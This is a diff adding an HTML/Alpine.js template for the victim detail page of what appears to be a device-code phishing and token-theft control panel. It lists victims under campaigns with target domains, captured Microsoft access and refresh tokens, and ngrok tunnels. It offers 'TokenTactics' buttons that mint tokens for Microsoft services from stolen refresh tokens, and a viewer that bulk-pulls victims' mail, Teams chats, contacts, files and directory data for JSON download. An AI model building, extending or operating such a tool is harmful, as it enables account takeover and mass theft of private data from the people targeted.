@@ -1,0 +1,633 @@
+{% extends 'base.html' %}
+
+{% block title %}Device: {{ device.hostname }}{% endblock %}
+
+{% block styles %}
+<style>
+    [x-cloak] { display: none !important; }
+    .scope-chip {
+        display: inline-flex; align-items: center;
+        font-size: 0.75rem; padding: 0.25rem 0.6rem;
+        border-radius: 9999px; background-color: #eef2ff; color: #4338ca;
+        margin: 0.25rem; font-weight: 500;
+    }
+    .scope-chip.readwrite { background-color: #fef3c7; color: #b45309; }
+    .role-chip {
+        display: inline-flex; align-items: center;
+        font-size: 0.75rem; padding: 0.25rem 0.6rem;
+        border-radius: 9999px; background-color: #fee2e2; color: #b91c1c;
+        margin: 0.25rem; font-weight: 500;
+    }
+    .svc-btn { min-height: 3.5rem; }
+    .data-svc-chip {
+        display: inline-flex; align-items: center; gap: 0.375rem;
+        font-size: 0.8125rem; font-weight: 600;
+        padding: 0.5rem 0.875rem; border-radius: 0.5rem;
+        border: 2px solid #e5e7eb; background: white; color: #374151;
+        cursor: pointer; transition: all 0.15s;
+    }
+    .data-svc-chip:hover { border-color: #c7d2fe; background: #eef2ff; }
+    .data-svc-chip.active { border-color: #4f46e5; background: #eef2ff; color: #4338ca; }
+    .viewer-table th {
+        font-size: 0.6875rem; text-transform: uppercase; letter-spacing: 0.05em;
+        color: #6b7280; font-weight: 600; text-align: left;
+        padding: 0.5rem 0.75rem; background: #f9fafb;
+        border-bottom: 1px solid #e5e7eb; white-space: nowrap;
+    }
+    .viewer-table td {
+        font-size: 0.8125rem; color: #374151;
+        padding: 0.5rem 0.75rem; border-bottom: 1px solid #f3f4f6;
+        vertical-align: top; max-width: 380px;
+    }
+    .viewer-table tr:hover td { background: #f9fafb; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div x-data="deviceDetail" class="space-y-6">
+
+    <div class="bg-white shadow-sm rounded-xl px-4 py-5 sm:px-6 border border-gray-100">
+        <div class="flex flex-wrap items-center justify-between gap-4">
+            <div class="flex items-center gap-4 min-w-0">
+                <a href="{{ url_for('web.list_devices') }}"
+                   class="text-gray-300 hover:text-gray-500 transition-colors p-1.5 rounded-lg hover:bg-gray-50"
+                   title="Back to devices">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+                    </svg>
+                </a>
+                <div class="min-w-0">
+                    <div class="flex items-center gap-2.5 flex-wrap">
+                        <h1 class="text-xl font-bold text-gray-900 truncate">{{ device.hostname }}</h1>
+                        {% if device.is_online %}
+                        <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 text-xs font-semibold rounded-full bg-green-50 text-green-700 border border-green-200">
+                            <span class="h-1.5 w-1.5 rounded-full bg-green-500"></span>Online</span>
+                        {% else %}
+                        <span class="inline-flex items-center gap-1.5 px-2.5 py-0.5 text-xs font-semibold rounded-full bg-gray-50 text-gray-500 border border-gray-200">
+                            <span class="h-1.5 w-1.5 rounded-full bg-gray-300"></span>Offline</span>
+                        {% endif %}
+                        {% if device.has_admin_permissions %}
+                        <span class="px-2.5 py-0.5 text-xs font-semibold rounded-full bg-red-50 text-red-700 border border-red-200">Admin Privileges</span>
+                        {% endif %}
+                    </div>
+                    {% if device.campaign %}
+                    <p class="text-sm text-gray-500 mt-1">
+                        Campaign:
+                        <a href="{{ url_for('campaign.campaign_detail', campaign_id=device.campaign.id) }}"
+                           class="text-indigo-600 hover:text-indigo-800 font-medium">{{ device.campaign.name }}</a>
+                        {% if device.campaign.target_domain %}· {{ device.campaign.target_domain }}{% endif %}
+                    </p>
+                    {% endif %}
+                </div>
+            </div>
+            <div class="flex items-center gap-2">
+                <button @click="deleteDevice()"
+                        class="bg-white hover:bg-red-50 text-red-600 text-sm font-medium py-2 px-4 rounded-lg transition-colors inline-flex items-center gap-2 border border-red-200">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
+                    </svg>
+                    Delete Device
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-5">
+        <div class="bg-white shadow-sm rounded-xl p-5 border border-gray-100">
+            <h3 class="text-xs font-semibold text-gray-400 uppercase tracking-wider">Identity</h3>
+            <dl class="mt-3 space-y-2.5 text-sm">
+                <div class="flex justify-between gap-3">
+                    <dt class="text-gray-500 shrink-0">User</dt>
+                    <dd class="text-gray-900 font-medium text-right break-words">{{ device.name or '—' }}</dd>
+                </div>
+                <div class="flex justify-between gap-3">
+                    <dt class="text-gray-500 shrink-0">UPN</dt>
+                    <dd class="text-gray-900 font-medium text-right break-all">{{ device.upn or '—' }}</dd>
+                </div>
+                <div class="flex justify-between gap-3">
+                    <dt class="text-gray-500 shrink-0">IP</dt>
+                    <dd class="text-gray-900 font-medium text-right">{{ device.ipaddr or '—' }}</dd>
+                </div>
+                <div class="flex justify-between gap-3">
+                    <dt class="text-gray-500 shrink-0">Device Code</dt>
+                    <dd class="text-gray-900 font-mono text-xs text-right">{{ device.device_code or '—' }}</dd>
+                </div>
+            </dl>
+        </div>
+
+        <div class="bg-white shadow-sm rounded-xl p-5 border border-gray-100">
+            <h3 class="text-xs font-semibold text-gray-400 uppercase tracking-wider">Connection</h3>
+            <dl class="mt-3 space-y-2.5 text-sm">
+                <div>
+                    <dt class="text-gray-500">Tunnel (ngrok)</dt>
+                    <dd class="mt-1.5">
+                        {% if device.ngrok_url %}
+                        <div class="flex items-center gap-2">
+                            <input type="text" readonly value="{{ device.ngrok_url }}" id="ngrokUrlInput"
+                                   class="text-xs bg-gray-50 p-1.5 rounded-md flex-1 min-w-0 truncate border border-gray-200 font-mono"/>
+                            <button @click="copyText(document.getElementById('ngrokUrlInput').value)"
+                                    class="text-blue-500 hover:text-blue-700 p-1" title="Copy">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                                </svg>
+                            </button>
+                        </div>
+                        {% else %}
+                        <span class="text-gray-400 text-xs">Not established</span>
+                        {% endif %}
+                    </dd>
+                </div>
+                <div class="flex justify-between gap-3">
+                    <dt class="text-gray-500 shrink-0">Last Seen</dt>
+                    <dd class="text-gray-900 font-medium text-right">{{ device.last_seen|humanize }}</dd>
+                </div>
+            </dl>
+        </div>
+
+        <div class="bg-white shadow-sm rounded-xl p-5 border border-gray-100">
+            <h3 class="text-xs font-semibold text-gray-400 uppercase tracking-wider">Token Status</h3>
+            <div class="mt-3 space-y-2.5 text-sm">
+                <div class="flex items-center justify-between">
+                    <span class="text-gray-500">Access Token</span>
+                    {% if device.access_token %}
+                    <button @click="inspectToken('device')" class="text-green-600 font-medium inline-flex items-center gap-1.5 hover:underline">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" /></svg>Present — Inspect</button>
+                    {% else %}
+                    <span class="text-gray-400">Pending</span>
+                    {% endif %}
+                </div>
+                <div class="flex items-center justify-between">
+                    <span class="text-gray-500">Refresh Token</span>
+                    {% if device.refresh_token %}
+                    <button @click="inspectToken('refresh')" class="text-green-600 font-medium inline-flex items-center gap-1.5 hover:underline">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" /></svg>Present — Raw</button>
+                    {% else %}
+                    <span class="text-gray-400">Pending</span>
+                    {% endif %}
+                </div>
+                {% if device.token_expiry %}
+                <div class="flex justify-between gap-3">
+                    <dt class="text-gray-500">Token Expiry</dt>
+                    <dd class="text-gray-900 font-medium text-right">{{ device.token_expiry.strftime('%d.%m.%Y %H:%M') }}</dd>
+                </div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+        <div class="px-4 py-4 sm:px-6 border-b border-gray-100">
+            <h2 class="text-base font-semibold text-gray-900">Permission Analysis</h2>
+            <p class="mt-0.5 text-sm text-gray-500">Access permissions derived from the access token scopes and roles.</p>
+        </div>
+        <div class="p-4 sm:p-5 space-y-4">
+            <div>
+                <h4 class="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">Scopes ({{ scopes|length }})</h4>
+                {% if scopes %}
+                <div class="flex flex-wrap -m-1">
+                    {% for scope in scopes %}
+                    <span class="scope-chip {{ 'readwrite' if '.ReadWrite' in (scope|string) }}">{{ scope }}</span>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p class="text-sm text-gray-400">No scope data — the access token may not be processed yet.</p>
+                {% endif %}
+            </div>
+            <div>
+                <h4 class="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-1.5">Roles ({{ roles|length }})</h4>
+                {% if roles %}
+                <div class="flex flex-wrap -m-1">
+                    {% for role in roles %}
+                    <span class="role-chip">{{ role }}</span>
+                    {% endfor %}
+                </div>
+                {% else %}
+                <p class="text-sm text-gray-400">No role data.</p>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+        <div class="px-4 py-4 sm:px-6 border-b border-gray-100">
+            <h2 class="text-base font-semibold text-gray-900">TokenTactics Service Tokens</h2>
+            <p class="mt-0.5 text-sm text-gray-500">
+                Mint tokens for all Microsoft services from the refresh token.
+                <span class="text-amber-600 font-medium">&#9733; Recommended</span> actions are flagged based on permission analysis.
+                Click <b>JWT</b> to view the minted token's claims.
+            </p>
+        </div>
+        <div class="p-4 sm:p-5">
+            {% if not device.refresh_token %}
+            <p class="text-sm text-gray-400 py-6 text-center">Waiting for refresh token — actions become available once authentication completes.</p>
+            {% else %}
+            <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3">
+                {% for key, service in token_services.items() %}
+                <div class="relative">
+                    {% if recommendations.get(key) %}
+                    <span class="absolute -top-1.5 -right-1 z-10 text-amber-500" title="{{ recommendations.get(key) }}">&#9733;</span>
+                    {% endif %}
+                    <div :class="generatedMap['{{ key }}'] ? 'border-green-200 bg-green-50/50' : 'border-gray-200 bg-white hover:border-indigo-200'"
+                         class="border rounded-lg p-3 transition-colors">
+                        <div class="flex items-center justify-between gap-2">
+                            <span class="text-sm font-semibold text-gray-800 truncate">{{ service.label }}</span>
+                            <template x-if="generatedMap['{{ key }}']">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-green-600 shrink-0" viewBox="0 0 20 20" fill="currentColor">
+                                    <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
+                                </svg>
+                            </template>
+                        </div>
+                        <div class="flex items-center gap-1.5 mt-2.5">
+                            <button x-show="!generatedMap['{{ key }}']" @click="genService('{{ key }}', '{{ service.label }}')"
+                                    :disabled="generating['{{ key }}']"
+                                    class="flex-1 bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 disabled:cursor-wait text-white text-xs font-semibold py-1.5 rounded-md transition-colors"
+                                    x-text="generating['{{ key }}'] ? 'Minting...' : 'Mint'"></button>
+                            <button x-show="generatedMap['{{ key }}']" x-cloak @click="genService('{{ key }}', '{{ service.label }}')"
+                                    :disabled="generating['{{ key }}']"
+                                    class="flex-1 bg-white hover:bg-gray-50 disabled:opacity-50 border border-gray-200 text-gray-700 text-xs font-semibold py-1.5 rounded-md transition-colors"
+                                    x-text="generating['{{ key }}'] ? '...' : 'Refresh'"></button>
+                            <button x-show="generatedMap['{{ key }}']" x-cloak @click="inspectToken('{{ key }}')"
+                                    class="bg-white hover:bg-gray-50 border border-gray-200 text-gray-500 text-xs font-semibold py-1.5 px-2.5 rounded-md transition-colors"
+                                    title="View JWT claims">JWT</button>
+                        </div>
+                    </div>
+                </div>
+                {% endfor %}
+            </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <div id="viewerCard" class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+        <div class="px-4 py-4 sm:px-6 border-b border-gray-100">
+            <h2 class="text-base font-semibold text-gray-900">Data Viewer</h2>
+            <p class="mt-0.5 text-sm text-gray-500">
+                Access real data with service tokens — <b>First N</b> quick view, <b>Fetch All</b> pulls all pages.
+                Resources open here automatically as new tokens are minted.
+            </p>
+        </div>
+        <div class="p-4 sm:p-5 space-y-4">
+            <div x-show="Object.keys(resources).length > 0" class="space-y-4">
+            <div class="flex flex-wrap gap-2">
+                <template x-for="(svc, skey) in resources" :key="skey">
+                    <button @click="setViewerService(skey)"
+                            :class="viewer.service === skey ? 'active' : ''"
+                            class="data-svc-chip">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5" viewBox="0 0 20 20" fill="currentColor">
+                            <path d="M2 6a2 2 0 012-2h4l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" />
+                        </svg>
+                        <span x-text="(serviceLabels[skey] && serviceLabels[skey].label) || skey"></span>
+                    </button>
+                </template>
+            </div>
+
+            <div class="flex flex-wrap items-end gap-3 pt-1">
+                <div>
+                    <label class="block text-xs font-medium text-gray-500 mb-1">Data Resource</label>
+                    <select x-model="viewer.resource" class="border border-gray-300 rounded-lg text-sm py-2 px-3 bg-white min-w-48">
+                        <template x-for="(label, rk) in resources[viewer.service] || {}" :key="rk">
+                            <option :value="rk" x-text="label"></option>
+                        </template>
+                    </select>
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-gray-500 mb-1">First N</label>
+                    <input type="number" min="1" max="999" x-model.number="viewer.top"
+                           class="border border-gray-300 rounded-lg text-sm py-2 px-3 w-20"/>
+                </div>
+                <button @click="fetchData(false)"
+                        :disabled="viewer.loading"
+                        class="bg-indigo-600 hover:bg-indigo-700 disabled:opacity-50 text-white text-sm font-semibold py-2 px-4 rounded-lg transition-colors"
+                        x-text="viewer.loading && !viewer.full ? 'Fetching...' : 'Fetch First N'"></button>
+                <button @click="fetchData(true)"
+                        :disabled="viewer.loading"
+                        class="bg-amber-500 hover:bg-amber-600 disabled:opacity-50 text-white text-sm font-semibold py-2 px-4 rounded-lg transition-colors inline-flex items-center gap-1.5"
+                        title="Bulk-pulls all pages (max 5000 records)">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+                    </svg>
+                    <span x-text="viewer.loading && viewer.full ? 'Collecting...' : 'Fetch All'"></span>
+                </button>
+            </div>
+
+            <div x-show="viewer.error" x-cloak class="bg-red-50 border border-red-200 rounded-lg p-3.5 text-sm text-red-700 whitespace-pre-wrap break-all"><span x-text="viewer.error"></span></div>
+
+            <div x-show="viewer.count !== null" x-cloak class="space-y-3">
+                <div class="flex flex-wrap items-center justify-between gap-3 bg-gray-50 border border-gray-200 rounded-lg px-3.5 py-2.5">
+                    <div class="flex items-center gap-2 text-sm">
+                        <span class="font-semibold text-gray-900" x-text="viewer.count"></span>
+                        <span class="text-gray-500">records</span>
+                        <span class="text-gray-300">·</span>
+                        <span class="text-xs font-medium px-2 py-0.5 rounded-full"
+                              :class="viewer.full ? 'bg-amber-100 text-amber-700' : 'bg-blue-100 text-blue-700'"
+                              x-text="viewer.full ? 'full pull' : 'first N'"></span>
+                        <span x-show="viewer.truncated" x-cloak class="text-xs font-medium px-2 py-0.5 rounded-full bg-orange-100 text-orange-700">more available — Fetch All</span>
+                    </div>
+                    <div class="flex gap-2">
+                        <button @click="copyText(JSON.stringify(viewer.items, null, 2))"
+                                class="text-xs bg-white hover:bg-gray-100 border border-gray-200 text-gray-700 py-1.5 px-3 rounded-md font-medium">Copy JSON</button>
+                        <button @click="downloadJson()"
+                                class="text-xs bg-white hover:bg-gray-100 border border-gray-200 text-gray-700 py-1.5 px-3 rounded-md font-medium">Download JSON</button>
+                    </div>
+                </div>
+                <div class="border border-gray-200 rounded-lg overflow-hidden overflow-x-auto">
+                    <table class="viewer-table w-full" x-html="renderedTable"></table>
+                </div>
+            </div>
+            </div>
+
+            <div x-show="Object.keys(resources).length === 0" class="text-center py-8">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 mx-auto text-gray-300 mb-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" />
+                </svg>
+                <p class="text-sm text-gray-500">Mint a service token first to view data.</p>
+                <p class="text-xs text-gray-400 mt-1">Mail, directory, subscriptions and similar resources open here once MS Graph, Outlook or Azure Management is minted.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white shadow-sm rounded-xl border border-gray-100 overflow-hidden">
+        <div class="px-4 py-4 sm:px-6 border-b border-gray-100">
+            <h2 class="text-base font-semibold text-gray-900">Device Logs</h2>
+            <p class="mt-0.5 text-sm text-gray-500">Last 50 events for this device.</p>
+        </div>
+        {% if logs %}
+        <ul class="divide-y divide-gray-100 max-h-96 overflow-y-auto">
+            {% for log in logs %}
+            <li class="px-4 sm:px-6 py-2.5 flex items-start justify-between gap-4 hover:bg-gray-50">
+                <p class="text-sm text-gray-600 break-words min-w-0">{{ log.log_message }}</p>
+                <span class="text-xs text-gray-400 whitespace-nowrap shrink-0">{{ log.timestamp|humanize }}</span>
+            </li>
+            {% endfor %}
+        </ul>
+        {% else %}
+        <div class="px-6 py-8 text-center text-gray-400 text-sm">No log entries for this device.</div>
+        {% endif %}
+    </div>
+
+    <div x-show="jwtModal" x-cloak class="fixed inset-0 overflow-y-auto z-50" style="display: none;">
+        <div class="flex items-end justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
+            <div class="fixed inset-0 bg-gray-900/60 transition-opacity" @click="jwtModal = false" aria-hidden="true"></div>
+            <div class="inline-block align-bottom bg-white rounded-xl text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-2xl w-full">
+                <div class="px-5 pt-5 pb-4">
+                    <h3 class="text-base font-semibold text-gray-900 mb-1">Token Inspection</h3>
+                    <p class="text-xs text-gray-500 mb-3" x-text="jwtTitle"></p>
+                    <div x-show="Object.keys(jwtClaims).length > 0" class="max-h-72 overflow-y-auto border border-gray-200 rounded-lg mb-3">
+                        <table class="viewer-table w-full">
+                            <tbody>
+                                <template x-for="(value, key) in jwtClaims" :key="key">
+                                    <tr>
+                                        <td class="font-semibold text-gray-700 whitespace-nowrap align-top" x-text="key"></td>
+                                        <td class="break-all" x-text="typeof value === 'object' ? JSON.stringify(value) : value"></td>
+                                    </tr>
+                                </template>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div x-show="jwtRaw" x-cloak>
+                        <div class="flex items-center justify-between mb-1.5">
+                            <span class="text-xs font-semibold text-gray-400 uppercase tracking-wider">Raw Token</span>
+                            <button @click="copyText(jwtRaw)"
+                                    class="text-xs bg-gray-100 hover:bg-gray-200 border border-gray-200 text-gray-700 py-1 px-2.5 rounded-md font-medium">Copy</button>
+                        </div>
+                        <textarea readonly x-text="jwtRaw" rows="6"
+                                  class="w-full text-xs font-mono bg-gray-900 text-green-300 rounded-lg p-3 break-all resize-y border border-gray-700"></textarea>
+                    </div>
+                </div>
+                <div class="bg-gray-50 px-5 py-3 flex flex-row-reverse gap-2 border-t border-gray-100">
+                    <button @click="jwtModal = false" type="button"
+                            class="rounded-lg border border-gray-300 px-4 py-2 bg-white text-sm font-medium text-gray-700 hover:bg-gray-50">Close</button>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+document.addEventListener('alpine:init', () => {
+    Alpine.data('deviceDetail', () => ({
+        hostname: {{ device.hostname|tojson }},
+        serviceLabels: {{ token_services|tojson }},
+        resources: {{ data_resources|tojson }},
+        generating: {},
+        generatedMap: {{ generated|tojson }},
+        viewer: { service: null, resource: null, top: 25, loading: false, full: false, error: '', items: [], count: null, truncated: false },
+        renderedTable: '',
+        jwtModal: false,
+        jwtClaims: {},
+        jwtRaw: '',
+        jwtTitle: '',
+
+        init() {
+            const keys = Object.keys(this.resources);
+            if (keys.length > 0) {
+                this.viewer.service = keys[0];
+                this.viewer.resource = Object.keys(this.resources[keys[0]])[0];
+            }
+        },
+
+        setViewerService(skey) {
+            this.viewer.service = skey;
+            this.viewer.resource = Object.keys(this.resources[skey] || {})[0];
+            this.viewer.error = '';
+        },
+
+        refreshResources(preselect) {
+            fetch('/api/device/' + encodeURIComponent(this.hostname) + '/resources')
+                .then(r => r.json())
+                .then(res => {
+                    this.resources = res || {};
+                    const keys = Object.keys(this.resources);
+                    if (preselect && this.resources[preselect]) {
+                        this.setViewerService(preselect);
+                        const card = document.getElementById('viewerCard');
+                        if (card) card.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    } else if (!this.resources[this.viewer.service] && keys.length) {
+                        this.setViewerService(keys[0]);
+                    }
+                })
+                .catch(() => {});
+        },
+
+        fetchData(full) {
+            if (this.viewer.loading) return;
+            this.viewer.loading = true;
+            this.viewer.full = full;
+            this.viewer.error = '';
+            const url = '/api/device/' + encodeURIComponent(this.hostname) +
+                '/data/' + this.viewer.service + '/' + this.viewer.resource +
+                '?top=' + (full ? 999 : this.viewer.top) + (full ? '&full=true' : '');
+            fetch(url)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.error) {
+                        this.viewer.error = data.error;
+                        this.viewer.count = null;
+                    } else {
+                        this.viewer.items = data.items || [];
+                        this.viewer.count = data.count || 0;
+                        this.viewer.truncated = !!data.truncated;
+                        this.viewer.rawText = !!data.raw_text;
+                        this.renderedTable = this.renderTable(this.viewer.items, this.viewer.resource);
+                        this.generatedMap[this.viewer.service] = true;
+                        this.refreshResources();
+                    }
+                })
+                .catch(() => { this.viewer.error = 'Error fetching data'; this.viewer.count = null; })
+                .finally(() => { this.viewer.loading = false; });
+        },
+
+        esc(s) {
+            return String(s ?? '—').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        },
+
+        fmtDate(iso) {
+            if (!iso) return '—';
+            try { return new Date(iso).toLocaleString('tr-TR'); } catch (e) { return iso; }
+        },
+
+        fmtSize(n) {
+            if (n == null) return '—';
+            if (n > 1048576) return (n / 1048576).toFixed(1) + ' MB';
+            if (n > 1024) return (n / 1024).toFixed(1) + ' KB';
+            return n + ' B';
+        },
+
+        renderTable(items, resource) {
+            if (!Array.isArray(items) || items.length === 0) {
+                return '<tbody><tr><td class="text-gray-400 py-6 text-center">No records</td></tr></tbody>';
+            }
+            if (this.viewer.rawText && items.length === 1 && items[0].raw) {
+                return '<tbody><tr><td style="white-space: pre-wrap; font-family: inherit;" class="text-gray-700">'
+                     + this.esc(items[0].raw) + '</td></tr></tbody>';
+            }
+            if (['me', 'tenantdetails'].includes(resource) && items.length >= 1) {
+                const o = items[0];
+                let rows = '';
+                Object.keys(o).forEach(k => {
+                    const v = o[k];
+                    rows += '<tr><td class="font-semibold text-gray-700 whitespace-nowrap align-top">' + this.esc(k) +
+                            '</td><td class="break-all">' + this.esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</td></tr>';
+                });
+                return '<tbody>' + rows + '</tbody>';
+            }
+
+            let head = '', rowFn;
+            switch (resource) {
+                case 'messages':
+                    head = 'From|Subject|Date|Preview';
+                    rowFn = m => [
+                        (m.from && m.from.emailAddress && m.from.emailAddress.address) || (m.sender && m.sender.emailAddress && m.sender.emailAddress.address) || '—',
+                        m.subject || '(no subject)',
+                        this.fmtDate(m.sentDateTime || m.createdDateTime),
+                        (m.bodyPreview || '').substring(0, 120)
+                    ];
+                    break;
+                case 'users':
+                    head = 'Name|UPN|Title';
+                    rowFn = u => [u.displayName || '—', u.userPrincipalName || '—', u.jobTitle || '—'];
+                    break;
+                case 'groups':
+                    head = 'Name|Email|Type';
+                    rowFn = g => [g.displayName || '—', g.mail || '—', (g.mailEnabled ? 'Mail' : '') + (g.securityEnabled ? ' Security' : '') || '—'];
+                    break;
+                case 'events':
+                    head = 'Subject|Start|Location|Organizer';
+                    rowFn = e => [e.subject || '—', this.fmtDate(e.start && e.start.dateTime), (e.location && e.location.displayName) || '—',
+                                  (e.organizer && e.organizer.emailAddress && e.organizer.emailAddress.address) || '—'];
+                    break;
+                case 'drive':
+                    head = 'File|Modified|Size|Type';
+                    rowFn = d => [d.name || '—', this.fmtDate(d.lastModifiedDateTime), this.fmtSize(d.size), (d.file && d.file.mimeType) || (d.folder ? 'folder' : '—')];
+                    break;
+                case 'sites':
+                    head = 'Site|URL|Description';
+                    rowFn = s => [s.displayName || s.Title || s.name || '—', s.webUrl || s.Path || '—', (s.description || s.Description || '').substring(0, 80)];
+                    break;
+                case 'chats':
+                    head = 'Chat|Last Updated|Last Message';
+                    rowFn = c => [c.topic || '(untitled chat)', this.fmtDate(c.lastUpdatedDateTime),
+                                  ((c.lastMessagePreview || {}).body || {}).content ? (c.lastMessagePreview.body.content || '').replace(/<[^>]*>/g, ' ').trim().substring(0, 100) : '—'];
+                    break;
+                case 'mailfolders':
+                    head = 'Folder|Total|Unread';
+                    rowFn = f => [f.displayName || '—', f.totalItemCount ?? '—', f.unreadItemCount ?? '—'];
+                    break;
+                case 'subscriptions':
+                    head = 'Subscription|State|ID';
+                    rowFn = s => [s.displayName || '—', s.state || '—', s.subscriptionId || '—'];
+                    break;
+                case 'contacts':
+                    head = 'Name|Email|Phone';
+                    rowFn = c => [c.displayName || '—', (c.emailAddresses && c.emailAddresses[0] && c.emailAddresses[0].address) || '—', c.mobilePhone || c.businessPhones && c.businessPhones[0] || '—'];
+                    break;
+                default:
+                    head = 'Data (JSON)';
+                    rowFn = i => [JSON.stringify(i)];
+            }
+            const cols = head.split('|');
+            let html = '<thead><tr>' + cols.map(c => '<th>' + this.esc(c) + '</th>').join('') + '</tr></thead><tbody>';
+            items.forEach(it => {
+                html += '<tr>' + rowFn(it).map(c => '<td>' + this.esc(c) + '</td>').join('') + '</tr>';
+            });
+            return html + '</tbody>';
+        },
+
+        genService(key, label) {
+            if (this.generating[key]) return;
+            this.generating[key] = true;
+            fetch('/api/device/' + encodeURIComponent(this.hostname) + '/token/' + key + '/generate')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.error) {
+                        alert(label + ' error:\n' + data.error);
+                    } else {
+                        this.generatedMap[key] = true;
+                        this.refreshResources(key);
+                        alert(data.message || (label + ' token minted'));
+                    }
+                })
+                .catch(() => alert(label + ' error while generating'))
+                .finally(() => { this.generating[key] = false; });
+        },
+
+        inspectToken(serviceKey) {
+            fetch('/api/device/' + encodeURIComponent(this.hostname) + '/token/' + serviceKey + '/inspect')
+                .then(r => r.json())
+                .then(data => {
+                    if (data.error) { alert('Hata: ' + data.error); return; }
+                    this.jwtClaims = data.claims || {};
+                    this.jwtRaw = data.raw || '';
+                    this.jwtTitle = data.label || serviceKey;
+                    this.jwtModal = true;
+                })
+                .catch(() => alert('Error inspecting token'));
+        },
+
+        downloadJson() {
+            const blob = new Blob([JSON.stringify(this.viewer.items, null, 2)], { type: 'application/json' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = this.hostname + '_' + this.viewer.service + '_' + this.viewer.resource + '.json';
+            a.click();
+            URL.revokeObjectURL(a.href);
+        },
+
+        deleteDevice() {
+            if (!confirm(this.hostname + ' device will be deleted?\n\nThe device record and Teams cache are deleted; logs are kept.')) return;
+            fetch('/api/device/' + encodeURIComponent(this.hostname) + '/delete', { method: 'POST' })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.error) { alert('Hata: ' + data.error); }
+                    else { window.location.href = '{{ url_for("web.list_devices") }}'; }
+                })
+                .catch(() => alert('Error deleting device'));
+        },
+
+        copyText(text) {
+            navigator.clipboard.writeText(text).catch(() => {});
+        }
+    }));
+});
+</script>
+{% endblock %}
